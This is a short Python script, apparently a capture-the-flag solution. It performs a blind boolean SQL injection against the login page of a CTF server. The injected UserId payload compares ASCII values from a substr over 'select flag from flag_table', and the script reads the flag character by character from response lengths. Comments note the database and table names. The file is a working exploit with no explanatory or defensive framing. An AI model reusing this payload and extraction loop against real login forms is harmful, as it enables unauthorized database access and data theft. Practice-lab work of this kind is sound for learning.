import requests

url = "http://ctf.segfaulthub.com:7777/sqli_3/login.php"

answer = ""

for i in range(1,40):
  for j in range(64,130):
    query =f"select flag from flag_table"
    sql = f"""normaltic' and (ascii(substr(({query}), {i}, 1)) > {j}) and '1' = '1"""

    data = {
      "UserId": sql,
      "Password": "1234",
      "Submit": "Login"
    }

    response = requests.post(url, data=data)
    if len(response.text) > 1500:
      answer += chr(j)
      break

  print(answer)
    

#(ascii(substr((__SQL__), 1, 1)) > i)

#DB명 : sqli_3
#column명 : flag_table, member
# flag_table -> flag
# member 